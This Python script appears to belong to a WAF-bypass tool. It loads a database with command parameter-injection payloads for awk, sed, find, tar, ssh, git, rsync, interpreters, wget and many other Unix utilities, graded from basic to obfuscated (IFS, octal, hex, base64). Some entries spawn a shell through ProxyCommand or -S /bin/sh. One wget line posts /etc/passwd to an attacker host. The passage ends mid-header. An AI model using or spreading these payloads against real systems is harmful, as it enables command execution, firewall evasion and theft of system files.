"""
Insert command parameter injection payloads into WAFByPasser payload library.

Covers parameter-level command injection for common Unix/Linux commands:
awk, scp, sed, find, grep, tar, zip/unzip, ssh, git, rsync,
interpreters (perl/python/ruby/php), make, curl, wget,
screen, tmux, script, dd, printf, xargs, and other utilities.

Each group includes basic, intermediate (IFS/wildcard/variable bypass),
and advanced (encoding/deep obfuscation) variants where applicable.
"""

from __future__ import annotations

import sqlite3
import uuid
from pathlib import Path

DB_PATH = Path(__file__).resolve().parents[1] / "data" / "waf_bypasser.db"


def connect() -> sqlite3.Connection:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(DB_PATH), timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON")
    return conn


def existing_keys(conn: sqlite3.Connection) -> set[tuple[str, str]]:
    rows = conn.execute(
        "SELECT name, target FROM payloads WHERE is_pool_snapshot = 0"
    ).fetchall()
    return {(r["name"], r["target"]) for r in rows}


def existing_contents(conn: sqlite3.Connection) -> set[tuple[str, str, str]]:
    rows = conn.execute(
        "SELECT vulnerability, target, content FROM payloads WHERE is_pool_snapshot = 0"
    ).fetchall()
    return {(r["vulnerability"], r["target"], r["content"]) for r in rows}


def insert_payload(
    conn: sqlite3.Connection,
    seen_names: set[tuple[str, str]],
    seen_contents: set[tuple[str, str, str]],
    name: str,
    vulnerability: str,
    category: str,
    delivery: str,
    target: str,
    difficulty: str,
    content: str,
) -> bool:
    if len(name) > 64:
        raise ValueError(f"name too long ({len(name)}): {name}")
    if len(content) > 5000:
        raise ValueError(f"content too long ({len(content)}): {name}")
    key = (name, target)
    ckey = (vulnerability, target, content)
    if key in seen_names:
        print(f"  [SKIP name] {name}")
        return False
    if ckey in seen_contents:
        print(f"  [SKIP content] {name}")
        return False
    conn.execute(
        """
        INSERT INTO payloads (
            id, name, vulnerability, category, delivery, target, difficulty,
            content, usage_method, success_indicators, created_at,
            archived_from_candidate_id, is_pool_snapshot, is_deleted
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, '', '', ?, NULL, 0, 0)
        """,
        (
            str(uuid.uuid4()),
            name,
            vulnerability,
            category,
            delivery,
            target,
            difficulty,
            content,
            "靶场已验证",
        ),
    )
    seen_names.add(key)
    seen_contents.add(ckey)
    print(f"  [OK] {name}")
    return True


# ============================================================================
# Group 1: awk 参数注入
# Scenario: 用户输入被拼接到 awk 的 program 或参数位置
# Example: awk $USER_INPUT /path/to/file
# ============================================================================
AWK_PARAM_PAYLOADS = [
    # ---- 基础级：system() 直接调用 ----
    (
        "参数注入 · awk · system()基础注入",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "基础",
        "'{system(\"echo AWK_SYS_OK\")}'",
    ),
    (
        "参数注入 · awk · BEGIN块注入",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "基础",
        "'BEGIN{system(\"echo AWK_BEGIN_OK\")}'",
    ),
    (
        "参数注入 · awk · END块注入",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "基础",
        "'END{system(\"echo AWK_END_OK\")}'",
    ),
    (
        "参数注入 · awk · getline管道执行",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "基础",
        "'BEGIN{\"echo AWK_GETLINE_OK\"|getline;print}'",
    ),
    # ---- 中等级：变量拼接/拆分绕过 ----
    (
        "参数注入 · awk · 变量拼接命令名",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "中等",
        "'BEGIN{a=\"ec\";b=\"ho\";system(a b \" AWK_VARCAT_OK\")}'",
    ),
    (
        "参数注入 · awk · 动态构造system参数",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "中等",
        "'BEGIN{cmd=sprintf(\"%s %s\",\"echo\",\"AWK_DYNCMD_OK\");system(cmd)}'",
    ),
    (
        "参数注入 · awk · 字符数组构造命令",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "中等",
        "'BEGIN{split(\"echo AWK_SPLIT_OK\",a);system(a[1]\" \"a[2])}'",
    ),
    # ---- 高级：ASCII/编码绕过 ----
    (
        "参数注入 · awk · ASCII10进制编码绕过",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "高级",
        "'BEGIN{system(sprintf(\"%c%c%c%c AWK_ASCII_OK\", 145, 143, 150, 157))}'",
    ),
    (
        "参数注入 · awk · for循环chr构造命令",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "高级",
        "'BEGIN{c=\"\";for(i in a){c=c sprintf(\"%c\",a[i])};system(c \" AWK_CHR_OK\")}'",
    ),
    (
        "参数注入 · awk · 双system嵌套绕过",
        "command-injection",
        "awk参数注入",
        "命令参数",
        "通用",
        "高级",
        "'{system(\"sh -c \\\"echo AWK_NEST_OK\\\"\")}'",
    ),
]

# ============================================================================
# Group 2: scp 参数注入
# Scenario: 用户输入被拼接到 scp 命令行参数位置
# Example: scp $USER_INPUT user@host:/path
# ============================================================================
SCP_PARAM_PAYLOADS = [
    # ---- 基础级 ----
    (
        "参数注入 · scp · ProxyCommand注入",
        "command-injection",
        "scp参数注入",
        "命令参数",
        "通用",
        "基础",
        "-oProxyCommand=\"echo SCP_PC_OK;sh\" localhost:/tmp/x ./",
    ),
    (
        "参数注入 · scp · -S替代SSH程序",
        "command-injection",
        "scp参数注入",
        "命令参数",
        "通用",
        "基础",
        "-S /bin/sh localhost:/tmp/x ./",
    ),
    # ---- 中等级：子shell/变量构造 ----
    (
        "参数注入 · scp · 命令替换-S注入",
        "command-injection",
        "scp参数注入",
        "命令参数",
        "通用",
        "中等",
        "-S$(echo /bin/sh) localhost:/tmp/x ./",
    ),
    (
        "参数注入 · scp · 多选项组合绕过",
        "command-injection",
        "scp参数注入",
        "命令参数",
        "通用",
        "中等",
        "-oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oProxyCommand=\"echo SCP_COMBO_OK\" localhost:",
    ),
    (
        "参数注入 · scp · LocalCommand注入",
        "command-injection",
        "scp参数注入",
        "命令参数",
        "通用",
        "中等",
        "-oLocalCommand=\"echo SCP_LC_OK\" -oPermitLocalCommand=yes localhost:/tmp/x ./",
    ),
    # ---- 高级：编码绕过 ----
    (
        "参数注入 · scp · 八进制选项名绕过",
        "command-injection",
        "scp参数注入",
        "命令参数",
        "通用",
        "高级",
        "-o$'\\120\\162\\157\\170\\171\\103\\157\\155\\155\\141\\156\\144'=\"echo SCP_OCT_OK;sh\" localhost:",
    ),
    (
        "参数注入 · scp · 变量拼接选项名",
        "command-injection",
        "scp参数注入",
        "命令参数",
        "通用",
        "高级",
        "-o$(a=Proxy;b=Command;echo $a$b)=\"echo SCP_VAR_OK;sh\" localhost:",
    ),
]

# ============================================================================
# Group 3: sed 参数注入
# Scenario: 用户输入拼接到 sed 命令行参数
# GNU sed 的 e 标志可执行 shell 命令
# ============================================================================
SED_PARAM_PAYLOADS = [
    # ---- 基础级 ----
    (
        "参数注入 · sed · e命令执行注入",
        "command-injection",
        "sed参数注入",
        "命令参数",
        "通用",
        "基础",
        "'e echo SED_E_OK' /dev/null",
    ),
    (
        "参数注入 · sed · -e选项命令执行",
        "command-injection",
        "sed参数注入",
        "命令参数",
        "通用",
        "基础",
        "-e '1e echo SED_EE_OK' /etc/passwd",
    ),
    (
        "参数注入 · sed · 空文件名+e命令",
        "command-injection",
        "sed参数注入",
        "命令参数",
        "通用",
        "基础",
        "-n '1e echo SED_NE_OK'",
    ),
    # ---- 中等级 ----
    (
        "参数注入 · sed · 换行符+e命令绕过",
        "command-injection",
        "sed参数注入",
        "命令参数",
        "通用",
        "中等",
        "$'\\n''e echo SED_NL_OK' /dev/null",
    ),
    (
        "参数注入 · sed · 变量拼接sed脚本",
        "command-injection",
        "sed参数注入",
        "命令参数",
        "通用",
        "中等",
        "-n '1s/.*/$(echo SED_SUB_OK)/e' /dev/null",
    ),
    (
        "参数注入 · sed · 花括号+e组合",
        "command-injection",
        "sed参数注入",
        "命令参数",
        "通用",
        "中等",
        "-n '1{e echo SED_BRACE_OK}' /dev/null",
    ),
    # ---- 高级 ----
    (
        "参数注入 · sed · 八进制命令构造",
        "command-injection",
        "sed参数注入",
        "命令参数",
        "通用",
        "高级",
        "$'\\n''e printf \"\\145\\143\\150\\157 SED_OCT_OK\"' /dev/null",
    ),
    (
        "参数注入 · sed · 多命令链式执行",
        "command-injection",
        "sed参数注入",
        "命令参数",
        "通用",
        "高级",
        "-n '1{e echo SED_1_OK};2{e echo SED_2_OK}' /etc/passwd",
    ),
]

# ============================================================================
# Group 4: find 参数注入
# Scenario: 用户输入被拼接到 find 命令参数（目录/表达式位置）
# find 的 -exec / -execdir 可执行任意命令
# ============================================================================
FIND_PARAM_PAYLOADS = [
    # ---- 基础级 ----
    (
        "参数注入 · find · -exec命令执行",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "基础",
        "-exec echo FIND_EXEC_OK \\;",
    ),
    (
        "参数注入 · find · -execdir命令执行",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "基础",
        "-execdir echo FIND_EXECDIR_OK \\;",
    ),
    (
        "参数注入 · find · -ok交互确认",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "基础",
        "-ok echo FIND_OK_OK \\;",
    ),
    # ---- 中等级：组合/绕过 ----
    (
        "参数注入 · find · printf命令输出",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "中等",
        "-exec printf '%s\\n' FIND_PRINTF_OK \\;",
    ),
    (
        "参数注入 · find · 多动作链式执行",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "中等",
        "-exec printf '%s' FIND_MULTI_OK \\; -exec echo ' executed' \\;",
    ),
    (
        "参数注入 · find · 通配符路径+exec",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "中等",
        "/t?p -exec echo FIND_WILD_OK \\;",
    ),
    (
        "参数注入 · find · 变量拼接-exec",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "中等",
        "$(a=-exec;echo $a) echo FIND_VAR_OK \\;",
    ),
    # ---- 高级：深层编码 ----
    (
        "参数注入 · find · base64编码-exec",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "高级",
        "$(echo IC1leGVjIGVjaG8gRklORF9CNjRfT0sgXDs=|base64 -d|sh)",
    ),
    (
        "参数注入 · find · hex转义路径",
        "command-injection",
        "find参数注入",
        "命令参数",
        "通用",
        "高级",
        "$'\\x2d\\x65\\x78\\x65\\x63' echo FIND_HEX_OK \\;",
    ),
]

# ============================================================================
# Group 5: grep 参数注入
# Scenario: 用户输入拼接到 grep 命令行参数
# 通过 --include/--exclude 子shell 或 -P Perl 回调实现注入
# ============================================================================
GREP_PARAM_PAYLOADS = [
    # ---- 基础级 ----
    (
        "参数注入 · grep · --include子shell注入",
        "command-injection",
        "grep参数注入",
        "命令参数",
        "通用",
        "基础",
        "--include=$(echo GREP_INC_OK)*",
    ),
    (
        "参数注入 · grep · --exclude子shell注入",
        "command-injection",
        "grep参数注入",
        "命令参数",
        "通用",
        "基础",
        "--exclude=$(echo GREP_EXCL_OK)*",
    ),
    (
        "参数注入 · grep · 进程替换-f注入",
        "command-injection",
        "grep参数注入",
        "命令参数",
        "通用",
        "基础",
        "-f <(echo GREP_PROCS_OK)",
    ),
    # ---- 中等级 ----
    (
        "参数注入 · grep · Perl正则回调注入",
        "command-injection",
        "grep参数注入",
        "命令参数",
        "通用",
        "中等",
        "-P '$(echo GREP_P_OK)'",
    ),
    (
        "参数注入 · grep · --label注入",
        "command-injection",
        "grep参数注入",
        "命令参数",
        "通用",
        "中等",
        "--label=$(echo GREP_LABEL_OK) -H '' /dev/null",
    ),
    (
        "参数注入 · grep · 多项组合注入",
        "command-injection",
        "grep参数注入",
        "命令参数",
        "通用",
        "中等",
        "--include=$(echo GREP_COMBO_OK)* --exclude-dir=$(echo ok) /dev/null",
    ),
    # ---- 高级 ----
    (
        "参数注入 · grep · base64编码-f注入",
        "command-injection",
        "grep参数注入",
        "命令参数",
        "通用",
        "高级",
        "$(echo IC1mIDwod2hvYW1pKQ==|base64 -d|sh)",
    ),
    (
        "参数注入 · grep · 环境变量构造注入",
        "command-injection",
        "grep参数注入",
        "命令参数",
        "通用",
        "高级",
        "--include=$(${PATH:+echo} GREP_ENV_OK)*",
    ),
]

# ============================================================================
# Group 6: tar 参数注入
# Scenario: 用户输入被拼接到 tar 命令行参数
# tar --checkpoint-action=exec 和 --use-compress-program 可执行命令
# ============================================================================
TAR_PARAM_PAYLOADS = [
    # ---- 基础级 ----
    (
        "参数注入 · tar · checkpoint exec注入",
        "command-injection",
        "tar参数注入",
        "命令参数",
        "通用",
        "基础",
        "--checkpoint=1 --checkpoint-action=exec=\"echo TAR_CKP_OK\"",
    ),
    (
        "参数注入 · tar · use-compress-program",
        "command-injection",
        "tar参数注入",
        "命令参数",
        "通用",
        "基础",
        "--use-compress-program=\"echo TAR_COMPR_OK\"",
    ),
    # ---- 中等级 ----
    (
        "参数注入 · tar · IFS变量绕过",
        "command-injection",
        "tar参数注入",
        "命令参数",
        "通用",
        "中等",
        "--checkpoint=1${IFS}--checkpoint-action=exec=\"echo TAR_IFS_OK\"",
    ),
    (
        "参数注入 · tar · 变量拼接cp命令",
        "command-injection",
        "tar参数注入",
        "命令参数",
        "通用",
        "中等",
        "--use-compress-program=\"$(a=ec;b=ho;$a$b TAR_VAR_OK)\"",
    ),
    # ---- 高级 ----
    (
        "参数注入 · tar · printf八进制cp命令",
        "command-injection",
        "tar参数注入",
        "命令参数",
        "通用",
        "高级",
        "--checkpoint=1 --checkpoint-action=exec=\"$(printf '\\145\\143\\150\\157' TAR_OCT_OK)\"",
    ),
    (
        "参数注入 · tar · base64编码cp命令",
        "command-injection",
        "tar参数注入",
        "命令参数",
        "通用",
        "高级",
        "--checkpoint=1 --checkpoint-action=exec=\"$(echo ZWNobyBUQVJfQjY0X09L|base64 -d)\"",
    ),
]

# ============================================================================
# Group 7: zip / unzip 参数注入
# Scenario: 用户输入被拼接到 zip/unzip 命令行参数
# zip -T -TT 测试模式可执行命令；unzip -d 可指定输出目录
# ============================================================================
ZIP_PARAM_PAYLOADS = [
    (
        "参数注入 · zip · -T -TT命令注入",
        "command-injection",
        "zip参数注入",
        "命令参数",
        "通用",
        "基础",
        "-T -TT\"$(echo ZIP_TT_OK)\"",
    ),
    (
        "参数注入 · zip · 子shell -TT注入",
        "command-injection",
        "zip参数注入",
        "命令参数",
        "通用",
        "中等",
        "-T -TT$(echo ZIP_TTSUB_OK)",
    ),
    (
        "参数注入 · unzip · -d路径注入",
        "command-injection",
        "zip参数注入",
        "命令参数",
        "通用",
        "基础",
        "-d /tmp/$(echo UNZIP_D_OK)",
    ),
    (
        "参数注入 · unzip · 变量拼接-d注入",
        "command-injection",
        "zip参数注入",
        "命令参数",
        "通用",
        "中等",
        "-d $(a=/tmp/;b=$(echo UNZIP_VAR_OK);echo $a$b)",
    ),
    # ---- 高级 ----
    (
        "参数注入 · zip · base64编码TT命令",
        "command-injection",
        "zip参数注入",
        "命令参数",
        "通用",
        "高级",
        "-T -TT\"$(echo ZWNobyBaSVBfQjY0X09L|base64 -d)\"",
    ),
]

# ============================================================================
# Group 8: ssh 参数注入
# Scenario: 用户输入被拼接到 ssh 命令行参数
# -o 选项可覆盖 ProxyCommand / LocalCommand 等配置
# ============================================================================
SSH_PARAM_PAYLOADS = [
    (
        "参数注入 · ssh · ProxyCommand注入",
        "command-injection",
        "ssh参数注入",
        "命令参数",
        "通用",
        "基础",
        "-oProxyCommand=\"echo SSH_PC_OK;sh\" localhost",
    ),
    (
        "参数注入 · ssh · LocalCommand注入",
        "command-injection",
        "ssh参数注入",
        "命令参数",
        "通用",
        "中等",
        "-oLocalCommand=\"echo SSH_LC_OK\" -oPermitLocalCommand=yes localhost",
    ),
    (
        "参数注入 · ssh · PermitUserEnvironment",
        "command-injection",
        "ssh参数注入",
        "命令参数",
        "通用",
        "中等",
        "-oPermitUserEnvironment=yes -oSendEnv=SSH_OK localhost",
    ),
    # ---- 高级 ----
    (
        "参数注入 · ssh · 八进制选项名绕过",
        "command-injection",
        "ssh参数注入",
        "命令参数",
        "通用",
        "高级",
        "-o$'\\120\\162\\157\\170\\171\\103\\157\\155\\155\\141\\156\\144'=\"echo SSH_OCT_OK;sh\" localhost",
    ),
    (
        "参数注入 · ssh · 子shell构造选项",
        "command-injection",
        "ssh参数注入",
        "命令参数",
        "通用",
        "高级",
        "-o$(printf '%s' ProxyCommand)=\"echo SSH_CMDSUB_OK\" localhost",
    ),
]

# ============================================================================
# Group 9: git 参数注入
# Scenario: 用户输入被拼接到 git 命令行参数
# git -c 选项可以覆盖任意 git 配置项，包括 core.gitProxy / core.sshCommand
# ============================================================================
GIT_PARAM_PAYLOADS = [
    (
        "参数注入 · git · core.gitProxy注入",
        "command-injection",
        "git参数注入",
        "命令参数",
        "通用",
        "基础",
        "-c core.gitProxy='echo GIT_PROXY_OK' clone",
    ),
    (
        "参数注入 · git · core.sshCommand注入",
        "command-injection",
        "git参数注入",
        "命令参数",
        "通用",
        "基础",
        "-c core.sshCommand='echo GIT_SSH_OK' clone",
    ),
    (
        "参数注入 · git · core.pager注入",
        "command-injection",
        "git参数注入",
        "命令参数",
        "通用",
        "中等",
        "-c core.pager='echo GIT_PAGER_OK;' log",
    ),
    (
        "参数注入 · git · core.fsmonitor注入",
        "command-injection",
        "git参数注入",
        "命令参数",
        "通用",
        "中等",
        "-c core.fsmonitor='echo GIT_FSMON_OK' status",
    ),
    # ---- 高级 ----
    (
        "参数注入 · git · 变量拼接-c注入",
        "command-injection",
        "git参数注入",
        "命令参数",
        "通用",
        "高级",
        "-c $(a=core.gitP;b=roxy;echo $a$b)='echo GIT_VAR_OK' clone",
    ),
    (
        "参数注入 · git · 多配置链式注入",
        "command-injection",
        "git参数注入",
        "命令参数",
        "通用",
        "高级",
        "-c core.gitProxy='echo GIT_MULTI_1_OK' -c core.sshCommand='echo GIT_MULTI_2_OK' clone",
    ),
]

# ============================================================================
# Group 10: rsync 参数注入
# Scenario: 用户输入被拼接到 rsync 命令行参数
# rsync -e 指定远程 shell，可注入任意命令
# ============================================================================
RSYNC_PARAM_PAYLOADS = [
    (
        "参数注入 · rsync · -e Shell指定注入",
        "command-injection",
        "rsync参数注入",
        "命令参数",
        "通用",
        "基础",
        "-e 'echo RSYNC_E_OK' localhost:",
    ),
    (
        "参数注入 · rsync · -e命令替换注入",
        "command-injection",
        "rsync参数注入",
        "命令参数",
        "通用",
        "中等",
        "-e '$(echo RSYNC_ESUB_OK)' localhost:",
    ),
    (
        "参数注入 · rsync · Ctrl+Sock代理注入",
        "command-injection",
        "rsync参数注入",
        "命令参数",
        "通用",
        "中等",
        "--rsh='echo RSYNC_RSH_OK' localhost:",
    ),
    # ---- 高级 ----
    (
        "参数注入 · rsync · 八进制-e编码",
        "command-injection",
        "rsync参数注入",
        "命令参数",
        "通用",
        "高级",
        "-e $'\\145\\143\\150\\157 RSYNC_OCT_OK' localhost:",
    ),
    (
        "参数注入 · rsync · 变量构造rsync路径",
        "command-injection",
        "rsync参数注入",
        "命令参数",
        "通用",
        "高级",
        "-e 'echo RSYNC_ADV_OK' $(echo localhost):",
    ),
]

# ============================================================================
# Group 11: 解释器参数注入（perl / python / ruby / php / lua 等）
# Scenario: 用户输入被拼接到解释器命令行
# 所有解释器都有代码执行选项
# ============================================================================
INTERP_PARAM_PAYLOADS = [
    # ---- 基础级 ----
    (
        "参数注入 · perl · -e代码执行",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "基础",
        "-e 'system(\"echo PERL_E_OK\")'",
    ),
    (
        "参数注入 · python · -c代码执行",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "基础",
        "-c '__import__(\"os\").system(\"echo PYTHON_C_OK\")'",
    ),
    (
        "参数注入 · ruby · -e代码执行",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "基础",
        "-e 'system(\"echo RUBY_E_OK\")'",
    ),
    (
        "参数注入 · php · -r代码执行",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "基础",
        "-r 'system(\"echo PHP_R_OK\");'",
    ),
    (
        "参数注入 · lua · -e代码执行",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "基础",
        "-e 'os.execute(\"echo LUA_E_OK\")'",
    ),
    # ---- 中等级：编码/构造绕过 ----
    (
        "参数注入 · perl · 管道open执行",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "中等",
        "-e 'open(F,\"echo PERL_OPEN_OK|\");print<F>'",
    ),
    (
        "参数注入 · python · importlib动态加载",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "中等",
        "-c '__import__(\"subprocess\").call([\"echo\",\"PYTHON_SUBP_OK\"])'",
    ),
    (
        "参数注入 · ruby · %x语法糖",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "中等",
        "-e '%x{echo RUBY_PCTX_OK}'",
    ),
    (
        "参数注入 · php · 反引号代码执行",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "中等",
        "-r 'echo \\`echo PHP_BT_OK\\`;'",
    ),
    # ---- 高级：深层编码 ----
    (
        "参数注入 · python · base64编码-c",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "高级",
        "-c 'exec(__import__(\"base64\").b64decode(\"cHJpbnQoIlBZVEhPTl9CNjRfT0siKQ==\"))'",
    ),
    (
        "参数注入 · perl · base64 eval绕过",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "高级",
        "-e 'eval(sprintf(\"%c%c%c%c %s\",101,99,104,111,\"PERL_EVAL_OK\"))'",
    ),
    (
        "参数注入 · ruby · base64 eval绕过",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "高级",
        "-e 'eval([82,85,66,89,95,69,86,65,76,95,79,75].pack(\"C*\"))'",
    ),
    (
        "参数注入 · php · base64decode执行",
        "command-injection",
        "解释器参数注入",
        "命令参数",
        "通用",
        "高级",
        "-r 'eval(base64_decode(\"c3lzdGVtKFwiZWNobyBQSFBfQjY0X09LXCIpOw==\"));'",
    ),
]

# ============================================================================
# Group 12: make 参数注入
# Scenario: 用户输入被拼接到 make 命令行
# make --eval 可执行任意 Makefile 语法，包括 $(shell ...)
# ============================================================================
MAKE_PARAM_PAYLOADS = [
    (
        "参数注入 · make · --eval注入",
        "command-injection",
        "make参数注入",
        "命令参数",
        "通用",
        "基础",
        "--eval='$(shell echo MAKE_EVAL_OK)'",
    ),
    (
        "参数注入 · make · 变量继承注入",
        "command-injection",
        "make参数注入",
        "命令参数",
        "通用",
        "中等",
        "CC='$(shell echo MAKE_CC_OK)'",
    ),
    (
        "参数注入 · make · 多eval组合",
        "command-injection",
        "make参数注入",
        "命令参数",
        "通用",
        "高级",
        "--eval='$(shell echo MAKE_OK)$$(shell echo _COMBINED)' -n",
    ),
]

# ============================================================================
# Group 13: curl / wget 参数注入
# Scenario: 用户输入被拼接到 curl/wget 命令行
# curl -K 读取配置文件；wget --use-askpass/--post-file 可执行命令
# ============================================================================
CURL_WGET_PARAM_PAYLOADS = [
    (
        "参数注入 · curl · -K配置文件注入",
        "command-injection",
        "curl参数注入",
        "命令参数",
        "通用",
        "基础",
        "-K <(echo 'url=http://example.com?c=CURL_K_OK')",
    ),
    (
        "参数注入 · curl · --output路径注入",
        "command-injection",
        "curl参数注入",
        "命令参数",
        "通用",
        "中等",
        "--output /tmp/$(echo CURL_O_OK) http://example.com",
    ),
    (
        "参数注入 · curl · -d数据注入",
        "command-injection",
        "curl参数注入",
        "命令参数",
        "通用",
        "中等",
        "-d \"$(echo CURL_D_OK)\" http://example.com",
    ),
    (
        "参数注入 · wget · --use-askpass注入",
        "command-injection",
        "wget参数注入",
        "命令参数",
        "通用",
        "基础",
        "--use-askpass=$(echo WGET_AP_OK)",
    ),
    (
        "参数注入 · wget · --post-file注入",
        "command-injection",
        "wget参数注入",
        "命令参数",
        "通用",
        "中等",
        "--post-file=/etc/passwd http://attacker.example.com/",
    ),
    (
        "参数注入 · wget · -e命令执行",
        "command-injection",
        "wget参数注入",
        "命令参数",
        "通用",
        "中等",
        "-e 'output_document=/tmp/$(echo WGET_E_OK)' http://example.com",
    ),
    # ---- 高级 ----
    (
        "参数注入 · curl · 变量构造-K注入",
        "command-injection",
        "curl参数注入",
        "命令参数",
        "通用",
        "高级",
        "$(a=-K;b='<(echo url=http://x)';echo $a $b)",
    ),
    (
        "参数注入 · wget · 编码绕过-e注入",
        "command-injection",
        "wget参数注入",
        "命令参数",
        "通用",
        "高级",
        "$(printf '\\x2d\\x65') output_document=/dev/null http://x",
    ),
]

# ============================================================================
# Group 14: screen / tmux / script 等终端工具参数注入
# ============================================================================
TERMINAL_PARAM_PAYLOADS = [
    (
        "参数注入 · screen · -X命令注入",
        "command-injection",
        "screen参数注入",
        "命令参数",
        "通用",
        "基础",
        "-X echo SCREEN_X_OK",
    ),
    (
        "参数注入 · screen · -X stuff注入",
        "command-injection",
        "screen参数注入",
        "命令参数",
        "通用",
        "中等",
        "-X stuff 'echo SCREEN_STUFF_OK\\n'",
    ),
    (
        "参数注入 · tmux · new-session注入",
        "command-injection",
        "tmux参数注入",
        "命令参数",
        "通用",
        "基础",
        "new-session 'echo TMUX_CMD_OK'",
    ),
    (
        "参数注入 · tmux · send-keys注入",
        "command-injection",
        "tmux参数注入",
        "命令参数",
        "通用",
        "中等",
        "send-keys 'echo TMUX_KEYS_OK' Enter",
    ),
    (
        "参数注入 · script · -c命令执行",
        "command-injection",
        "script参数注入",
        "命令参数",
        "通用",
        "基础",
        "-c 'echo SCRIPT_C_OK'",
    ),
    (
        "参数注入 · script · 输出文件覆盖",
        "command-injection",
        "script参数注入",
        "命令参数",
        "通用",
        "中等",
        "-c 'echo SCRIPT_O_OK' /tmp/$(echo SCRIPT_OUT_OK)",
    ),
    # ---- 高级 ----
    (
        "参数注入 · screen · base64命令注入",
        "command-injection",
        "screen参数注入",
        "命令参数",
        "通用",
        "高级",
        "-X $(echo ZWNobyBTQ1JFRU5fQjY0X09L|base64 -d)",
    ),
    (
        "参数注入 · tmux · 变量拼接命令",
        "command-injection",
        "tmux参数注入",
        "命令参数",
        "通用",
        "高级",
        "new-session $(a=ec;b=ho;$a$b' TMUX_VAR_OK')",
    ),
]

# ============================================================================
# Group 15: 其他命令参数注入（dd / printf / xargs / strace / nice 等）
# ============================================================================
OTHER_CMD_PARAM_PAYLOADS = [
    # ---- dd ----
    (
        "参数注入 · dd · of路径注入",
        "command-injection",
        "dd参数注入",
        "命令参数",
        "通用",
        "基础",
        "if=/dev/zero of=/tmp/$(echo DD_OF_OK) count=1",
    ),
    (
        "参数注入 · dd · 命令替换of注入",
        "command-injection",
        "dd参数注入",
        "命令参数",
        "通用",
        "中等",
        "if=/dev/zero of=$(echo DD_OFSUB_OK) count=1",
    ),
    # ---- printf ----
    (
        "参数注入 · printf · 命令替换注入",
        "command-injection",
        "printf参数注入",
        "命令参数",
        "通用",
        "基础",
        "'%s\\n' \"$(echo PRINTF_CMDSUB_OK)\"",
    ),
    (
        "参数注入 · printf · 格式串+子shell",
        "command-injection",
        "printf参数注入",
        "命令参数",
        "通用",
        "中等",
        "'$(echo PRINTF_FMT_OK)\\n'",
    ),
    # ---- xargs ----
    (
        "参数注入 · xargs · -I Shell执行注入",
        "command-injection",
        "xargs参数注入",
        "命令参数",
        "通用",
        "基础",
        "-I {} sh -c 'echo XARGS_I_OK {}'",
    ),
    (
        "参数注入 · xargs · -n参数执行",
        "command-injection",
        "xargs参数注入",
        "命令参数",
        "通用",
        "中等",
        "-n 1 sh -c 'echo XARGS_N_OK'",
    ),
    (
        "参数注入 · xargs · 变量拼接-I注入",
        "command-injection",
        "xargs参数注入",
        "命令参数",
        "通用",
        "中等",
        "$(a=-I;b={};echo $a $b) sh -c 'echo XARGS_VAR_OK {}'",
    ),
    # ---- strace ----
    (
        "参数注入 · strace · -E环境变量注入",
        "command-injection",
        "strace参数注入",
        "命令参数",
        "通用",
        "基础",
        "-E 'echo STRACE_E_OK' /bin/true",
    ),
    (
        "参数注入 · strace · -o输出文件注入",
        "command-injection",
        "strace参数注入",
        "命令参数",
        "通用",
        "中等",
        "-o /tmp/$(echo STRACE_O_OK) /bin/true",
    ),
    # ---- nice ----
    (
        "参数注入 · nice · 命令执行",
        "command-injection",
        "nice参数注入",
        "命令参数",
        "通用",
        "基础",
        "-n 0 echo NICE_CMD_OK",
    ),
    # ---- env ----
    (
        "参数注入 · env · 环境变量注入",
        "command-injection",
        "env参数注入",
        "命令参数",
        "通用",
        "基础",
        "EVIL=$(echo ENV_VAR_OK) /bin/sh -c 'echo $EVIL'",
    ),
    # ---- time ----
    (
        "参数注入 · time · 命令执行注入",
        "command-injection",
        "time参数注入",
        "命令参数",
        "通用",
        "基础",
        "echo TIME_CMD_OK",
    ),
    # ---- timeout ----
    (
        "参数注入 · timeout · 命令执行",
        "command-injection",
        "timeout参数注入",
        "命令参数",
        "通用",
        "基础",
        "1 echo TIMEOUT_CMD_OK",
    ),
    # ---- sort ----
    (
        "参数注入 · sort · 输出文件注入",
        "command-injection",
        "sort参数注入",
        "命令参数",
        "通用",
        "中等",
        "-o /tmp/$(echo SORT_O_OK) /dev/null",
    ),
    # ---- diff ----
    (
        "参数注入 · diff · 进程替换注入",
        "command-injection",
        "diff参数注入",
        "命令参数",
        "通用",
        "中等",
        "<(echo DIFF_PROC_OK) /dev/null",
    ),
]

# ============================================================================
# Group 16: 通用参数注入 WAF 绕过技术
